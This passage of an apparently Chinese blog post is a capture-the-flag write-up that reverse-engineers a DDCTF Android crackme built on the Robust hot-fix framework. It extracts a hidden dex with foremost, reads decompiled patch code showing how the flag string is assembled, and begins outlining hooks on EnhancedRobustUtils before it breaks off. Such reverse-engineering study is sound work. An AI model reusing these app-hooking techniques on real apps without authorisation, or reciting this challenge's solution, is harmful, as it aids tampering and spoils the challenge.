class="line">                    changeQuickRedirectField.set(null, patchObject);</span><br><span class="line">                    Log.d(&quot;robust&quot;, &quot;changeQuickRedirectField set sucess &quot; + patchClassName);</span><br><span class="line">                &#125; catch (Throwable t) &#123;</span><br><span class="line">                    Log.e(&quot;robust&quot;, &quot;patch failed! &quot;);</span><br><span class="line">                    t.printStackTrace();</span><br><span class="line">                    robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor method:patch line:163&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (Throwable t) &#123;</span><br><span class="line">                Log.e(&quot;robust&quot;, &quot;patch failed! &quot;);</span><br><span class="line">                t.printStackTrace();</span><br><span class="line">                robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor method:patch line:169&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.d(&quot;robust&quot;, &quot;patch finished &quot;);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="4-isSupport和accessDispatch"><a href="#4-isSupport和accessDispatch" class="headerlink" title="4.isSupport和accessDispatch"></a>4.isSupport和accessDispatch</h3><p>我们再来看看onCreate()中的代码，虽然混淆后代码看起来很冗长，但是通过刚刚对Robust原理的简单分析，现在已经可以清晰的知道，这其实就是isSupport()和accessDispatch()。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public void onCreate(Bundle arg13) &#123;</span><br><span class="line">        int v4 &#x3D; 3;</span><br><span class="line">        Object[] v0 &#x3D; new Object[1];</span><br><span class="line">        v0[0] &#x3D; arg13;</span><br><span class="line">        ChangeQuickRedirect v2 &#x3D; MainActivity.changeQuickRedirect;</span><br><span class="line">        Class[] v5 &#x3D; new Class[1];</span><br><span class="line">        Class v1 &#x3D; Bundle.class;</span><br><span class="line">        v5[0] &#x3D; v1;</span><br><span class="line">        Class v6 &#x3D; Void.TYPE;</span><br><span class="line">        MainActivity v1_1 &#x3D; this;</span><br><span class="line">        boolean v0_1 &#x3D; PatchProxy.isSupport(v0, v1_1, v2, false, v4, v5, v6);</span><br><span class="line">        if(v0_1) &#123;</span><br><span class="line">            v0 &#x3D; new Object[1];</span><br><span class="line">            v0[0] &#x3D; arg13;</span><br><span class="line">            v2 &#x3D; MainActivity.changeQuickRedirect;</span><br><span class="line">            v5 &#x3D; new Class[1];</span><br><span class="line">            v1 &#x3D; Bundle.class;</span><br><span class="line">            v5[0] &#x3D; v1;</span><br><span class="line">            v6 &#x3D; Void.TYPE;</span><br><span class="line">            v1_1 &#x3D; this;</span><br><span class="line">            PatchProxy.accessDispatch(v0, v1_1, v2, false, v4, v5, v6);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line"> </span><br><span class="line">           .....</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105185712828.png" alt="image-20210105185712828"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public static boolean isSupport(Object[] paramsArray, Object current, ChangeQuickRedirect changeQuickRedirect, boolean isStatic, int methodNumber, Class[] paramsClassTypes, Class returnType) &#123;</span><br><span class="line">        &#x2F;&#x2F;Robust补丁优先执行，其他功能靠后</span><br><span class="line">        if (changeQuickRedirect &#x3D;&#x3D; null) &#123;</span><br><span class="line">            &#x2F;&#x2F;不执行补丁，轮询其他监听者</span><br><span class="line">            if (registerExtensionList &#x3D;&#x3D; null || registerExtensionList.isEmpty()) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            for (RobustExtension robustExtension : registerExtensionList) &#123;</span><br><span class="line">                if (robustExtension.isSupport(new RobustArguments(paramsArray, current, isStatic, methodNumber, paramsClassTypes, returnType))) &#123;</span><br><span class="line">                    robustExtensionThreadLocal.set(robustExtension);</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;获取 classMethod &#x3D; className + &quot;:&quot; + methodName + &quot;:&quot; + isStatic + &quot;:&quot; + methodNumber;</span><br><span class="line">        String classMethod &#x3D; getClassMethod(isStatic, methodNumber);</span><br><span class="line">        if (TextUtils.isEmpty(classMethod)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        Object[] objects &#x3D; getObjects(paramsArray, current, isStatic);</span><br><span class="line">        try &#123;</span><br><span class="line">        &#x2F;*调用changeQuickRedirect.isSupport，还记得这个changeQuickRedirect</span><br><span class="line">        吗，他是在第3步中changeQuickRedirectField.set(null, patchObject);</span><br><span class="line">        得到的补丁类的实例。*&#x2F;</span><br><span class="line">            return changeQuickRedirect.isSupport(classMethod, objects);</span><br><span class="line">        &#125; catch (Throwable t) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过上面的分析，可以知道只有当存在补丁的类changeQuickRedirect.isSupport()才会返回值。这个时候我们把刚刚第二步打包的dex反编译看看，我们可以看到在xxxPatchControl类中存在isSupport，它返回的值其实就是methodNumber。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public boolean isSupport(String methodName, Object[] paramArrayOfObject) &#123;</span><br><span class="line">        return &quot;18:&quot;.contains(methodName.split(&quot;:&quot;)[3]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>accessDispatch()方法，替换原方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public static Object accessDispatch(Object[] paramsArray, Object current, ChangeQuickRedirect changeQuickRedirect, boolean isStatic, int methodNumber, Class[] paramsClassTypes, Class returnType) &#123;</span><br><span class="line"> </span><br><span class="line">       &#x2F;&#x2F;如果changeQuickRedirect为null...</span><br><span class="line">        if (changeQuickRedirect &#x3D;&#x3D; null) &#123;</span><br><span class="line">            RobustExtension robustExtension &#x3D; robustExtensionThreadLocal.get();</span><br><span class="line">            robustExtensionThreadLocal.remove();</span><br><span class="line">            if (robustExtension !&#x3D; null) &#123;</span><br><span class="line">                notify(robustExtension.describeSelfFunction());</span><br><span class="line">                return robustExtension.accessDispatch(new RobustArguments(paramsArray, current, isStatic, methodNumber, paramsClassTypes, returnType));</span><br><span class="line">            &#125;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;同样获取 classMethod &#x3D; className + &quot;:&quot; + methodName + &quot;:&quot; + isStatic + &quot;:&quot; + methodNumber;</span><br><span class="line">        String classMethod &#x3D; getClassMethod(isStatic, methodNumber);</span><br><span class="line">        if (TextUtils.isEmpty(classMethod)) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        notify(Constants.PATCH_EXECUTE);</span><br><span class="line"> </span><br><span class="line">        Object[] objects &#x3D; getObjects(paramsArray, current, isStatic);</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F;返回changeQuickRedirect.accessDispatch。</span><br><span class="line">        return changeQuickRedirect.accessDispatch(classMethod, objects);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>具体看看PatchControl类中的accessDispatch。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">public Object accessDispatch(String methodName, Object[] paramArrayOfObject) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        MainActivityPatch mainActivityPatch;</span><br><span class="line">        &#x2F;&#x2F;判断classMethod的isStatic是否为false，其实在调用accessDispatch传递的就是false。</span><br><span class="line">        if (methodName.split(&quot;:&quot;)[2].equals(&quot;false&quot;)) &#123;</span><br><span class="line">            MainActivityPatch mainActivityPatch2;</span><br><span class="line">            if (keyToValueRelation.get(paramArrayOfObject[paramArrayOfObject.length - 1]) &#x3D;&#x3D; null) &#123;</span><br><span class="line">                mainActivityPatch2 &#x3D; new MainActivityPatch(paramArrayOfObject[paramArrayOfObject.length - 1]);</span><br><span class="line">                keyToValueRelation.put(paramArrayOfObject[paramArrayOfObject.length - 1], null);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                mainActivityPatch2 &#x3D; (MainActivityPatch) keyToValueRelation.get(paramArrayOfObject[paramArrayOfObject.length - 1]);</span><br><span class="line">            &#125;</span><br><span class="line">            mainActivityPatch &#x3D; mainActivityPatch2;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            mainActivityPatch &#x3D; new MainActivityPatch(null);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;根据methodNumber，选取要执行的patch方法。</span><br><span class="line">        Object obj &#x3D; methodName.split(&quot;:&quot;)[3];</span><br><span class="line">        if (&quot;3&quot;.equals(obj)) &#123;</span><br><span class="line">            mainActivityPatch.onCreate((Bundle) paramArrayOfObject[0]);</span><br><span class="line">        &#125;</span><br><span class="line">        if (&quot;6&quot;.equals(obj)) &#123;</span><br><span class="line">            return mainActivityPatch.Joseph(((Integer) paramArrayOfObject[0]).intValue(), ((Integer) paramArrayOfObject[1]).intValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Throwable th) &#123;</span><br><span class="line">        th.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Robust的基本原理就是这些了</p><h2 id="hook点分析"><a href="#hook点分析" class="headerlink" title="hook点分析"></a>hook点分析</h2><p>我们对Robust进行分析，现在已经比较清晰的知道了我们需要攻克的难点，它是通过Robust热修复框架将一些方法热修复了，所以我们这里必须知道，它修复了哪些类及方法。</p><p>foremost提取assets文件夹下的GeekTan.BMP，得到dex文件直接扔到jadx中进行分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">─$ foremost GeekTan.BMP</span><br><span class="line">foremost: &#x2F;usr&#x2F;local&#x2F;etc&#x2F;foremost.conf: No such file or directory</span><br><span class="line">Processing: GeekTan.BMP</span><br><span class="line">|foundat&#x3D;classes.dex�,�dex</span><br><span class="line">035</span><br><span class="line">*|</span><br></pre></td></tr></table></figure><p>在PatchesInfoImpl类中可以看到2个要被修复的类信息。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105190528663.png" alt="image-20210105190528663"></p><p>MainActivityPatchControl类，我们看到在accessDispatch()，onCreate()和Joseph()方法将会通过判断ethodNumber来选取。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105190724026.png" alt="image-20210105190724026"></p><p>继续查看MainActivity$1PatchControl类，同样发现onClick被修复了。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105190859996.png" alt="image-20210105190859996"></p><p>所以这个时候，我们必须知道onClick真正执行的逻辑是什么。查看MainActivity$1Patch类中的真正的onClick方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">package cn.chaitin.geektan.crackme;</span><br><span class="line"></span><br><span class="line">import android.content.Context;</span><br><span class="line">import android.text.Editable;</span><br><span class="line">import android.text.TextUtils;</span><br><span class="line">import android.view.View;</span><br><span class="line">import android.widget.EditText;</span><br><span class="line">import android.widget.Toast;</span><br><span class="line">import cn.chaitin.geektan.crackme.MainActivity;</span><br><span class="line">import com.meituan.robust.patch.RobustModify;</span><br><span class="line">import com.meituan.robust.utils.EnhancedRobustUtils;</span><br><span class="line"></span><br><span class="line">public class MainActivity$1Patch &#123;</span><br><span class="line">    MainActivity.1 originClass;</span><br><span class="line"></span><br><span class="line">    public MainActivity$1Patch(Object obj) &#123;</span><br><span class="line">        this.originClass &#x3D; (MainActivity.1) obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object[] getRealParameter(Object[] objArr) &#123;</span><br><span class="line">        if (objArr &#x3D;&#x3D; null || objArr.length &lt; 1) &#123;</span><br><span class="line">            return objArr;</span><br><span class="line">        &#125;</span><br><span class="line">        Object[] objArr2 &#x3D; new Object[objArr.length];</span><br><span class="line">        for (int i &#x3D; 0; i &lt; objArr.length; i++) &#123;</span><br><span class="line">            if (objArr[i] &#x3D;&#x3D; this) &#123;</span><br><span class="line">                objArr2[i] &#x3D; this.originClass;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                objArr2[i] &#x3D; objArr[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return objArr2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void onClick(View view) &#123;</span><br><span class="line">        MainActivity$1Patch mainActivity$1Patch;</span><br><span class="line">        EnhancedRobustUtils.invokeReflectStaticMethod(&quot;modify&quot;, RobustModify.class, getRealParameter(new Object[0]), (Class[]) null);</span><br><span class="line">        MainActivity.1 r0 &#x3D; (EditText) EnhancedRobustUtils.getFieldValue(&quot;val$input_text&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class);</span><br><span class="line">        if (r0 &#x3D;&#x3D; this) &#123;</span><br><span class="line">            r0 &#x3D; ((MainActivity$1Patch) r0).originClass;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!((Boolean) EnhancedRobustUtils.invokeReflectStaticMethod(&quot;isEmpty&quot;, TextUtils.class, getRealParameter(new Object[]&#123;(Editable) EnhancedRobustUtils.invokeReflectMethod(&quot;getText&quot;, r0, new Object[0], (Class[]) null, EditText.class)&#125;), new Class[]&#123;CharSequence.class&#125;)).booleanValue()) &#123;</span><br><span class="line">            MainActivity.1 r02 &#x3D; (EditText) EnhancedRobustUtils.getFieldValue(&quot;val$input_text&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class);</span><br><span class="line">            if (r02 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r02 &#x3D; ((MainActivity$1Patch) r02).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.1 r03 &#x3D; (Editable) EnhancedRobustUtils.invokeReflectMethod(&quot;getText&quot;, r02, new Object[0], (Class[]) null, EditText.class);</span><br><span class="line">            if (r03 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r03 &#x3D; ((MainActivity$1Patch) r03).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.1 r04 &#x3D; (String) EnhancedRobustUtils.invokeReflectMethod(&quot;toString&quot;, r03, new Object[0], (Class[]) null, Object.class);</span><br><span class="line">            MainActivity.1 r1 &#x3D; (StringBuilder) EnhancedRobustUtils.invokeReflectConstruct(&quot;java.lang.StringBuilder&quot;, new Object[0], (Class[]) null);</span><br><span class="line">            if (r1 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r1 &#x3D; ((MainActivity$1Patch) r1).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.1 r12 &#x3D; (StringBuilder) EnhancedRobustUtils.invokeReflectMethod(&quot;append&quot;, r1, getRealParameter(new Object[]&#123;&quot;DDCTF&#123;&quot;&#125;), new Class[]&#123;String.class&#125;, StringBuilder.class);</span><br><span class="line">            MainActivity.1 r2 &#x3D; (MainActivity) EnhancedRobustUtils.getFieldValue(&quot;this$0&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class);</span><br><span class="line">            if (r2 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r2 &#x3D; ((MainActivity$1Patch) r2).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            String str &#x3D; (String) EnhancedRobustUtils.invokeReflectMethod(&quot;Joseph&quot;, r2, getRealParameter(new Object[]&#123;new Integer(5), new Integer(6)&#125;), new Class[]&#123;Integer.TYPE, Integer.TYPE&#125;, MainActivity.class);</span><br><span class="line">            if (r12 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r12 &#x3D; ((MainActivity$1Patch) r12).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.1 r13 &#x3D; (StringBuilder) EnhancedRobustUtils.invokeReflectMethod(&quot;append&quot;, r12, getRealParameter(new Object[]&#123;str&#125;), new Class[]&#123;String.class&#125;, StringBuilder.class);</span><br><span class="line">            MainActivity.1 r22 &#x3D; (MainActivity) EnhancedRobustUtils.getFieldValue(&quot;this$0&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class);</span><br><span class="line">            if (r22 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r22 &#x3D; ((MainActivity$1Patch) r22).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            String str2 &#x3D; (String) EnhancedRobustUtils.invokeReflectMethod(&quot;Joseph&quot;, r22, getRealParameter(new Object[]&#123;new Integer(7), new Integer(8)&#125;), new Class[]&#123;Integer.TYPE, Integer.TYPE&#125;, MainActivity.class);</span><br><span class="line">            if (r13 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r13 &#x3D; ((MainActivity$1Patch) r13).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.1 r14 &#x3D; (StringBuilder) EnhancedRobustUtils.invokeReflectMethod(&quot;append&quot;, r13, getRealParameter(new Object[]&#123;str2&#125;), new Class[]&#123;String.class&#125;, StringBuilder.class);</span><br><span class="line">            if (r14 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r14 &#x3D; ((MainActivity$1Patch) r14).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.1 r15 &#x3D; (StringBuilder) EnhancedRobustUtils.invokeReflectMethod(&quot;append&quot;, r14, getRealParameter(new Object[]&#123;&quot;&#125;&quot;&#125;), new Class[]&#123;String.class&#125;, StringBuilder.class);</span><br><span class="line">            if (r15 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r15 &#x3D; ((MainActivity$1Patch) r15).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            String str3 &#x3D; (String) EnhancedRobustUtils.invokeReflectMethod(&quot;toString&quot;, r15, new Object[0], (Class[]) null, StringBuilder.class);</span><br><span class="line">            if (r04 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r04 &#x3D; ((MainActivity$1Patch) r04).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            if (((Boolean) EnhancedRobustUtils.invokeReflectMethod(&quot;equals&quot;, r04, getRealParameter(new Object[]&#123;str3&#125;), new Class[]&#123;Object.class&#125;, String.class)).booleanValue()) &#123;</span><br><span class="line">                if (this instanceof MainActivity$1Patch) &#123;</span><br><span class="line">                    mainActivity$1Patch &#x3D; this.originClass;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    mainActivity$1Patch &#x3D; this;</span><br><span class="line">                &#125;</span><br><span class="line">                MainActivity.1 r05 &#x3D; (Toast) EnhancedRobustUtils.invokeReflectStaticMethod(&quot;makeText&quot;, Toast.class, getRealParameter(new Object[]&#123;(MainActivity) EnhancedRobustUtils.getFieldValue(&quot;this$0&quot;, mainActivity$1Patch, MainActivity.1.class), &quot;恭喜大佬！密码正确！&quot;, new Integer(0)&#125;), new Class[]&#123;Context.class, CharSequence.class, Integer.TYPE&#125;);</span><br><span class="line">                if (r05 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                    r05 &#x3D; ((MainActivity$1Patch) r05).originClass;</span><br><span class="line">                &#125;</span><br><span class="line">                EnhancedRobustUtils.invokeReflectMethod(&quot;show&quot;, r05, new Object[0], (Class[]) null, Toast.class);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        MainActivity.1 r06 &#x3D; (Toast) EnhancedRobustUtils.invokeReflectStaticMethod(&quot;makeText&quot;, Toast.class, getRealParameter(new Object[]&#123;(MainActivity) EnhancedRobustUtils.getFieldValue(&quot;this$0&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class), &quot;大佬莫急！再试试！&quot;, new Integer(0)&#125;), new Class[]&#123;Context.class, CharSequence.class, Integer.TYPE&#125;);</span><br><span class="line">        if (r06 &#x3D;&#x3D; this) &#123;</span><br><span class="line">            r06 &#x3D; ((MainActivity$1Patch) r06).originClass;</span><br><span class="line">        &#125;</span><br><span class="line">        EnhancedRobustUtils.invokeReflectMethod(&quot;show&quot;, r06, new Object[0], (Class[]) null, Toast.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析onClick方法，可以发现很多<code>invokeReflectStaticMethod</code>，<code>getFieldValue</code>，<code>invokeReflectMethod</code>方法，同样我们还能发现flag就在这里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;flag是通过append将字符串以及Joseph（int,int）的返回值拼接构成的。</span><br><span class="line">String str &#x3D; &quot;DDCTF&#123;&quot;;</span><br><span class="line">str &#x3D; (String) EnhancedRobustUtils.invokeReflectMethod(&quot;Joseph&quot;, obj2, getRealParameter(new Object[]&#123;new Integer(5), new Integer(6)&#125;), new Class[]&#123;Integer.TYPE, Integer.TYPE&#125;, MainActivity.class);</span><br><span class="line">str &#x3D; (String) EnhancedRobustUtils.invokeReflectMethod(&quot;Joseph&quot;, obj2, getRealParameter(new Object[]&#123;new Integer(7), new Integer(8)&#125;), new Class[]&#123;Integer.TYPE, Integer.TYPE&#125;, MainActivity.class);</span><br><span class="line">str &#x3D; &quot;&#125;&quot;;</span><br><span class="line">&#x2F;&#x2F;最终将我们输入的值与上面构造的equals比较，判断是否准确。</span><br><span class="line">if (((Boolean) EnhancedRobustUtils.invokeReflectMethod(&quot;equals&quot;, obj, getRealParameter(new Object[]&#123;str2&#125;), new Class[]&#123;Object.class&#125;, String.class)).booleanValue()) &#123;...&#125;</span><br></pre></td></tr></table></figure><p>通过上面的分析，可以发现hook有2个思路：</p><p>1.hook <code>EnhancedRobustUtils</code>类下的方法获取方法执行的返回值。<br>2.hook 动态加载的类<code>MainActivityPatch</code>的<code>Joseph</code>方法，直接调用它获取返回值。（下篇）</p><h2 id="代码构造"><a href="#代码构造" class="headerlink" title="代码构造"></a>代码构造</h2><p>先来看看EnhancedRobustUtils类下的方法<code>invokeReflectMethod</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public static Object invokeReflectMethod(String methodName, Object targetObject, Object[] parameters, Class[] args, Class declaringClass) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F;可以看到这里是通过反射的方法拿到类实例</span><br><span class="line">            Method method &#x3D; getDeclaredMethod(targetObject, methodName, args, declaringClass);</span><br><span class="line">            &#x2F;&#x2F;代入参数，调用方法</span><br><span class="line">            return method.invoke(targetObject, parameters);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        if (isThrowable) &#123;</span><br><span class="line">            throw new RuntimeException(&quot;invokeReflectMethod error &quot; + methodName + &quot;   parameter   &quot; + parameters + &quot; targetObject &quot; + targetObject.toString() + &quot;  args  &quot; + args);</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>invokeReflectConstruct</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public static Object invokeReflectConstruct(String className, Object[] parameter, Class[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F;通过Class.forName(className)反射得到一个Class对象</span><br><span class="line">            Class clazz &#x3D; Class.forName(className);</span><br><span class="line">            &#x2F;&#x2F;获得构造器</span><br><span class="line">            Constructor constructor &#x3D; clazz.getDeclaredConstructor(args);</span><br><span class="line">            constructor.setAccessible(true);</span><br><span class="line">            &#x2F;&#x2F;返回该类的实例</span><br><span class="line">            return constructor.newInstance(parameter);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        if (isThrowable) &#123;</span><br><span class="line">            throw new 